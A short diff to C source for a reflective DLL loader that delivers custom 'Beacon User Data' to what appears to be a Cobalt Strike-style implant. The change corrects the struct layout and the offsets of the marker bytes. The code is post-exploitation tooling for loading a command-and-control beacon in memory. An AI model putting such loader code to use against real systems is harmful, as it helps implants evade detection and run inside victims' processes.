@@ -561,16 +561,27 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
 #if defined(BW_UDRL_USER_DATA_DELIVER)
     /* 4.9 Beacon User Data: deliver a 32-byte custom buffer with reason
      * 0x0d BEFORE the standard PROCESS_ATTACH - the official contract.
+     * Layout must mirror beacon USER_DATA_UD byte-for-byte: syscalls is
+     * an EMBEDDED {entries ptr, count, pad} struct, NOT a bare pointer -
+     * customData lives at offset 24 and sizeof == 56 (the first delivery
+     * attempt used a pointer field, put custom at 16, and the handler
+     * copied from 24: marker bytes + stack garbage, never contiguous).
      * Four volatile QWORD stores (volatile defeats XMM vectorization into
-     * .rdata; the bake carries only .text). QWORD values are built
-     * LITTLE-ENDIAN so the in-memory buffer reads as the marker string.
+     * .rdata; the bake carries only .text); values are LITTLE-ENDIAN so
+     * the in-memory buffer reads as the marker string.
      * Build with /DBW_UDRL_USER_DATA_DELIVER=1 to enable. */
     {
-        struct { unsigned int length; unsigned int version; void *syscalls; char custom[32]; } ud;
+        struct {
+            unsigned int length;
+            unsigned int version;
+            struct { void * entries; unsigned int count; } syscalls;
+            char custom[32];
+        } ud;
         volatile unsigned long long * dst;
         ud.length = (unsigned int)sizeof(ud);
         ud.version = 1;
-        ud.syscalls = NULL;
+        ud.syscalls.entries = NULL;
+        ud.syscalls.count = 0;
         dst = (volatile unsigned long long *)ud.custom;
         *dst++ = 0x3332313044553350ULL;
         *dst++ = 0x4241393837363534ULL;
